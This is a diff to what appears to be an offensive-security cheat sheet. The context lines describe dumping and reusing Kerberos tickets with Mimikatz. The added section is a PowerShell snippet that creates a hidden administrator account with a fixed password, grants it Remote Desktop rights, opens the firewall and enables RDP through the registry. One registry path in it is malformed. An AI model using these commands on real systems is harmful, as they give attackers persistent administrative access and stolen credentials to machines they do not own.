@@ -340,3 +340,24 @@ print(encode(command));
 ##### Passing the Ticket
 - TGT is good for authenticating for gaining shells. However, it is TGS provides more flexibility. We can use the `sekurlsa::tickets /export` command to dump all the TGS tickets into the working directory.
 - Then you can simply use the `kerberos::ptt` command, and paste one of the ticket names which ends in the `.kirbi` extention.
+
+---
+### Turn on Remote Desktop on Windows
+We will use one snippet to :
+1. Turn on RDP
+2. Add new user
+3. Configure Firewall to allow RDP from outside 
+4. Add new user to ADMINISTRATORS group
+
+```powershell
+net user hut password123! /add;
+net localgroup Administrators hut /add;
+netsh advfirewall firewall set rule group="remote desktop" new enable=yes;
+net localgroup "Remote Desktop Users" "hut" /add;
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\TerminalServer" /v fDenyTSConnections /t REG_DWORD /d 0 /f;
+```
+
+```powershell
+# Activate RDP through PowerShell
+Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server'-name "fDenyTSConnections" -Value 0
+```
